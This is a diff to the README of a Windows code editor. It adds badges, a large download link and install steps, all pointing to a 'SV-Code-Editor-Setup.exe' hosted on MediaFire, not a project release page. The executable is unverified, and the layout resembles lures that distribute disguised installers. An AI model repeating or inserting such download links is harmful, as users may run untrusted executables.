@@ -1,5 +1,25 @@
 # SV Code Editor (v1.0.0)
 
+[![Download SV Code Editor](https://img.shields.io/badge/Download-SV%20Code%20Editor%20v1.0.0%20(Setup.exe)-007ACC?style=for-the-badge&logo=windows&logoColor=white)](https://www.mediafire.com/file/mvkwbgh7l5wmhv2/SV-Code-Editor-Setup.exe/file)
+[![Windows 10/11 x64](https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-blue?style=for-the-badge)](https://www.mediafire.com/file/mvkwbgh7l5wmhv2/SV-Code-Editor-Setup.exe/file)
+[![Direct Download](https://img.shields.io/badge/Direct%20Download-MediaFire-orange?style=for-the-badge&logo=mediafire&logoColor=white)](https://www.mediafire.com/file/mvkwbgh7l5wmhv2/SV-Code-Editor-Setup.exe/file)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
+
+---
+
+### 📥 Direct Download & Instant Installation
+
+Click below to download the official Windows Installer (`SV-Code-Editor-Setup.exe`):
+
+### 🚀 [**Click Here to Download & Install SV Code Editor (v1.0.0)**](https://www.mediafire.com/file/mvkwbgh7l5wmhv2/SV-Code-Editor-Setup.exe/file)
+
+> **Quick Install Instructions**:
+> 1. Click the download link above to download **`SV-Code-Editor-Setup.exe`** from MediaFire.
+> 2. Run the installer (per-user, non-administrator installation into `%LOCALAPPDATA%\SV Code Editor\`).
+> 3. SV Code Editor launches instantly with desktop shortcuts and `svcode` CLI enabled.
+
+---
+
 **SV Code Editor** (`sv-code-editor`, CLI: `svcode`) is a code editor for Windows 10 and Windows 11. It helps you write code, manage projects, use AI to make changes, and analyze software files.
 
 It is built using Tauri v2, Rust, Preact, and Monaco Editor. These technologies help the editor run quickly and use less memory.
